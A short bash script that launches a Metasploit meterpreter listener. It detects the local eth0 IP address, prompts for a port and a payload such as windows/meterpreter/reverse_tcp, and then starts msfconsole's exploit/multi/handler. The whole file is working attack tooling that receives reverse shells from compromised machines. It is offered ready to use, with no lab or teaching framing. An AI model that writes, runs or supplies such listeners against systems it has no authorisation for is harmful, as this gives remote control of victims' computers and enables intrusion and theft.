#!/bin/bash
clear
echo "*********************************************"
echo "   METASPLOIT LINUX METERPRETER LISTENER    *" 
echo "*********************************************"
IP=$(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1)
echo "Using IP address... $IP"
#echo $TEST
#echo -en  "What is the IP of your listener? Please type it and press [ENTER]: "
#read IP
echo -en "What is the port number on your listener? Please type it and press [ENTER]: "
read port
echo -en "What payload do you want to use? e.g. windows/meterpreter/reverse_tcp: "
read pload
echo "      starting the meterpreter listener.."
msfconsole -x "use exploit/multi/handler; set PAYLOAD $pload; set LHOST $IP; set LPORT $port; exploit"
